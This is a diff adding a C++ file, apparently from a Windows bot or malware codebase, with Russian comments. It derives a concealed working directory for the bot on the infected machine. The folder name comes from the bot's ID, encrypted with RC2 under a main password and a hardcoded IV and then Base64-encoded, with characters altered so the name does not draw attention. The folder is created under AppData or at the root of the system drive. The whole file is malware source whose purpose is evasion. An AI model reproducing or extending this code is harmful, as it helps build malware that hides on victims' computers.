@@ -1,0 +1,139 @@
+//---------------------------------------------------------------------------
+#include <shlobj.h>
+#include "BotCore.h"
+
+//---------------------------------------------------------------------------
+
+//const WORK_PATH[] = {'S', 'E', 'T', '_', 'R', 'N', 'D', '_', 'P', 'A', 'T', 'H', '-', '9',  0};
+
+
+//---------------------------------------------------------------------------
+#define MAX_BOT_WORK_FOLDER_LEN 15
+
+char BOT_WORK_FOLDER_NAME[MAX_BOT_WORK_FOLDER_LEN + 1] = {0};
+
+DWORD BotWorkPathHash = 0;
+
+
+
+
+PCHAR BotGetWorkFolder()
+{
+	
+	// Функция возвращает рабочий каталог бота (короткое имя)
+	// Имя папки получаем из уида бота, который прогоняется ключём шифрования
+	if (!STR::IsEmpty(BOT_WORK_FOLDER_NAME))
+		return BOT_WORK_FOLDER_NAME;
+
+	// Получаем уид и шифруем его
+	PCHAR UID = GenerateBotID();
+
+    PCHAR Password = GetMainPassword(true);
+
+    const static char IV[] = {'d', 'j', 't', 'm', 'f', 'p', 'H', 'k',  0};
+
+	DWORD BufSize = StrCalcLength(UID);
+	LPBYTE Encrypted = RC2Crypt::WinEncode((LPBYTE)UID, BufSize, Password, (PCHAR)IV);
+	PCHAR B64 = BASE64::Encode(Encrypted, BufSize);
+
+	// Исправляем некоторые символе в результате
+	for (PCHAR S = B64; *S != 0; S++)
+    {
+		if (*S == '/')
+			*S = 'z';  // недопустимый символ
+		else
+		if (*S == '+')
+			*S = 'v';  // Редко встречается в названиях, не мозолим глаза :))
+	}
+
+	// Копируем строку
+	DWORD MCopy = MAX_BOT_WORK_FOLDER_LEN;
+	if (MCopy > STR::Length(B64))
+		MCopy = STR::Length(B64);
+
+	STR::Copy(B64, BOT_WORK_FOLDER_NAME, 0, MCopy);
+
+	// Уничтожаем промежуточные данные
+	STR::Free(Password);
+	STR::Free(UID);
+	MemFree(Encrypted);
+	STR::Free(B64);
+
+	// Расчитываем хэш
+	BotWorkPathHash = CalcHash(BOT_WORK_FOLDER_NAME);
+
+	return BOT_WORK_FOLDER_NAME;
+}
+//----------------------------------------------------------------------------
+
+PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
+{
+	// Функция возвращает рабочий каталог бота
+
+	PCHAR Path = STR::Alloc(MAX_PATH);
+
+	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_APPDATA, TRUE))
+		return NULL;
+
+
+	if (InSysPath)
+	{
+		// Получаем путь в системной папке
+		PCHAR Tmp = STR::Scan(Path, ':');
+		if (Tmp == NULL)
+			return NULL;
+        Tmp++;
+		*Tmp = 0;
+	}
+
+
+    PCHAR WorkPath = BotGetWorkFolder(); // резервируем на будущее
+
+	// Добавляем основной путь
+	StrConcat(Path, "\\");
+	StrConcat(Path, WorkPath);
+
+	if (!DirExists(Path))
+		pCreateDirectoryA(Path, NULL);
+
+	StrConcat(Path, "\\");
+
+	// Добавляем подиректорию
+	if (!STR::IsEmpty(SubDir))
+	{
+		StrConcat(Path, SubDir);
+
+		if (!DirExists(Path))
+			pCreateDirectoryA(Path, NULL);
+    }
+
+	PCHAR Result = STR::New(2, Path, FileName);
+    STR::Free(Path);
+	return  Result;
+}
+//----------------------------------------------------------------------------
+
+PCHAR BOT::GetWorkPath(PCHAR SubDir, PCHAR FileName)
+{
+	//  Функция возвращает рабочий путь бота
+    return BOTDoGetWorkPath(false, SubDir, FileName);
+
+}
+//----------------------------------------------------------------------------
+
+PCHAR BOT::GetWorkPathInSysDrive(PCHAR SubDir, PCHAR FileName)
+{
+	//  Аналог функции GetWorkPath.
+	//  Главное от личие от нёэ в том, что пусть
+	//   создаётся в корне системного диска
+    return BOTDoGetWorkPath(true, SubDir, FileName);
+}
+//----------------------------------------------------------------------------
+
+DWORD BOT::GetWorkFolderHash()
+{
+	//  Функция возвращает хэш имени рабочей папки
+	BotGetWorkFolder();
+	return BotWorkPathHash;
+}
+//----------------------------------------------------------------------------
